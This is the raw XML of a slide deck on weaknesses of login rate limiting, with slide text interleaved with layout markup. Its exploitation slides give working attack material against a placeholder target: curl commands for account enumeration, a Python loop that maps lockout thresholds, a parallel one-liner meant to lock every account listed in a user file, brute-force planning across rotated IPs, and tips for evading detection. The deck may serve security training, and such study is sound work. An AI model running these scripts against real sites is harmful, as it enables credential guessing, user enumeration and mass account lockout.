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Kanit Light" panose="020B0604020202020204" charset="-34"/>
      <p:regular r:id="rId15"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Martel San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86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60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Why Rate Limiting Can Be Dangerous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9688"/>
            <a:ext cx="83328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Hidden Risks of Rate Limiting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358628"/>
            <a:ext cx="6571417" cy="4561284"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3580"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="437066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585442"/>
            <a:ext cx="30088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1. Information Disclosure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166586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Weak rate limits leak critical intel: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3733562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Exact attempt thresholds (e.g., 5 failed logins = 429)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Reset windows (e.g., "try again in 300s")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Account-specific limits vs global limits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Legitimate user patterns (when limits reset)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5627132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Example:</a:t>
            </a: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GET /login?user=admin&amp;pass=wrong → 429 Too Many Requests: 3/5 attempts remaining, resets in 60s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5854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2. Bypass Vectors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166586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IP rotation (tor, proxies, residential IPs)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Parameter pollution (user=admin&amp;username=admin)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Race conditions (parallel requests)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Account enumeration via inconsistent responses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Bursty attacks (max out limit, wait, repeat)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79277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3. DoS Amplification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80190" y="1792724"/>
            <a:ext cx="75564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Rate limits create perfect DoS vectors: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80190" y="2309693"/>
            <a:ext cx="2396252" cy="2898100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 357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91883" y="2521387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3706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0237" y="2689741"/>
            <a:ext cx="275511" cy="2755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1883" y="3317438"/>
            <a:ext cx="197286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Account Lockout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491883" y="3746421"/>
            <a:ext cx="1972866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Lock ALL accounts with targeted brute force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860155" y="2309693"/>
            <a:ext cx="2396371" cy="2898100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 357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071848" y="2521387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3706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40203" y="2689741"/>
            <a:ext cx="275511" cy="27551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71848" y="3317438"/>
            <a:ext cx="1972985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Window Exhaustion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9071848" y="4065270"/>
            <a:ext cx="1972985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Exhaust reset windows across userbase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11440239" y="2309693"/>
            <a:ext cx="2396252" cy="2898100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 357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651933" y="2521387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3706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820287" y="2689741"/>
            <a:ext cx="275511" cy="27551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651933" y="3317438"/>
            <a:ext cx="1972866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Cascading Failures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11651933" y="4065270"/>
            <a:ext cx="1972866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Trigger cascading failures (auth → payment → email)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280190" y="5391507"/>
            <a:ext cx="7556302" cy="1958697"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 437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91883" y="5603200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37066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0237" y="5771555"/>
            <a:ext cx="275511" cy="27551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91883" y="639925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Resource Drain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6491883" y="6828234"/>
            <a:ext cx="7132915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Consume expensive resources (CAPTCHA solving, SMS 2FA)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3827"/>
            <a:ext cx="87581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Rate Limiting vs Brute Force vs DoS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06234"/>
            <a:ext cx="13042821" cy="2979420"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 31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21385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3357563"/>
            <a:ext cx="2408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Attack Type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898225" y="3357563"/>
            <a:ext cx="2404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Goal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764179" y="3357563"/>
            <a:ext cx="31864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Rate Limit Impact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411897" y="3357563"/>
            <a:ext cx="31902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Detection Difficulty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86417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4007882"/>
            <a:ext cx="2408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Brute Force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898225" y="4007882"/>
            <a:ext cx="2404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Valid credentials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764179" y="4007882"/>
            <a:ext cx="31864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Slows you down, but solvable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411897" y="4007882"/>
            <a:ext cx="31902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Medium (noise)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51449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462" y="4658201"/>
            <a:ext cx="2408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Rate Limited Brute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3898225" y="4658201"/>
            <a:ext cx="2404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Find bypass/threshold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764179" y="4658201"/>
            <a:ext cx="31864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Reveals exact limits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411897" y="4658201"/>
            <a:ext cx="31902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Low (looks legitimate)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5164812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5308521"/>
            <a:ext cx="2408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DoS via Rate Limit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3898225" y="5308521"/>
            <a:ext cx="24047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Lockout/service denial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764179" y="5308521"/>
            <a:ext cx="31864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Amplifies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impact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411897" y="5308521"/>
            <a:ext cx="31902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 (blends with legit traffic)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42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Exploitation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83706"/>
            <a:ext cx="768381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1. Account Enumeration via Rate Limits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3890843"/>
            <a:ext cx="13042821" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 442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3890843"/>
            <a:ext cx="13065443" cy="21545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09293" y="4060865"/>
            <a:ext cx="1261181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Test user existence via response differences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-o /dev/null -w "%{http_code}\n" "https://target.com/login" \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-d "username=exists" -d "password=wrong"    # 429 after 5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-o /dev/null -w "%{http_code}\n" "https://target.com/login" \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-d "username=notexists" -d "password=wrong" # 200/400 always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5345"/>
            <a:ext cx="6501527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2. Threshold Mapping (Super Valuable)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3790" y="1664970"/>
            <a:ext cx="13042821" cy="5709285"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1418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4265" y="1664970"/>
            <a:ext cx="13061871" cy="5709285"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50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77027" y="1809512"/>
            <a:ext cx="12676346" cy="542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map_rate_limit(base_url, username):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headers = {'User-Agent': 'Mozilla/5.0...'}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fails = 0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while True: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 = requests.post(base_url,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data={'username':username, 'password':'wrong'},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headers=headers)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fails += 1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print(f"Attempt {fails}: {r.status_code} - {r.text[:100]}")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if r.status_code == 429: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# PARSE LIMIT INFO FROM RESPONSE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print(f"*** HIT LIMIT AT {fails} attempts ***")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break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time.sleep(0.1)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map_rate_limit("https://target.com/login", "admin")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1465"/>
            <a:ext cx="85840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Advanced Exploitation Techniques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17219"/>
            <a:ext cx="33905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3. DoS via Rate Limit Abuse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126700"/>
            <a:ext cx="6244709" cy="2880360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 330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3126700"/>
            <a:ext cx="6267331" cy="2880360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 118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09293" y="3296722"/>
            <a:ext cx="581370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Lock every user account simultaneously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 users.txt | xargs -I {} -P 50 sh -c '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in {1..6}; do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 -s -X POST "https://target.com/login" \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-d "username=$1" -d "password=wrong" &gt;/dev/null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done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 sh {}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517219"/>
            <a:ext cx="46787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4. Smart Brute Force (Post-Limit Intel)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0983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If limit = 5/minute per IP per account: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99521" y="371641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4591" y="375892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8336637" y="3790117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Need 12 IPs × 5 attempts = 60 attempts/minute/account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99521" y="49695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4591" y="501205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8336637" y="5043249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Rotate IPs every 4 attempts (stay under radar)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599521" y="59334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4591" y="597598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8336637" y="6007179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Parallel across 100 accounts = 6000 attempts/minute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5793"/>
            <a:ext cx="7395805" cy="70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Detection Evasion Techniques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1647" y="1783794"/>
            <a:ext cx="226100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1647" y="2137529"/>
            <a:ext cx="4198620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791647" y="2311479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Human-like timing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1647" y="2800112"/>
            <a:ext cx="4198620" cy="72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2-7s between attempts, gaussian distribution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5771" y="1783794"/>
            <a:ext cx="226100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5771" y="2137529"/>
            <a:ext cx="4198739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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5215771" y="2311479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UA rotation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5771" y="2800112"/>
            <a:ext cx="4198739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Legit browser fingerprints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014" y="1783794"/>
            <a:ext cx="226100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014" y="2137529"/>
            <a:ext cx="4198739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014" y="2311479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Partial payloads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014" y="2800112"/>
            <a:ext cx="4198739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username correct, rotate passwords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1647" y="3917871"/>
            <a:ext cx="226100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1647" y="4271605"/>
            <a:ext cx="6410801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791647" y="4445556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Conditional limits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1647" y="4934188"/>
            <a:ext cx="6410801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Only trigger on "close" passwords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7952" y="3917871"/>
            <a:ext cx="226100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7952" y="4271605"/>
            <a:ext cx="6410801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1" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7427952" y="4445556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Distributed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7952" y="4934188"/>
            <a:ext cx="6410801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1000 low-volume IPs &gt; 1 high-volume IP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91647" y="5718810"/>
            <a:ext cx="13047107" cy="1884997"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5040"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CFE2DE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46" y="6032063"/>
            <a:ext cx="282654" cy="2261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526500" y="6000750"/>
            <a:ext cx="12086153" cy="72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Insight</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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: A properly tested rate limit implementation is rare. Most leak thresholds, apply inconsistently, or create worse DoS vectors than no limits at all.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1526500" y="6926461"/>
            <a:ext cx="12086153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Weak rate limiting = roadmap for attackers. Strong rate limiting = still usually bypassable with minimal effort.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</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>112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Consolas</vt:lpstr>
      <vt:lpstr>Kanit Light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2026-03-02T06:19:33Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-02T06:21:12Z</dcterms:modified>
</cp:coreProperties>
</file>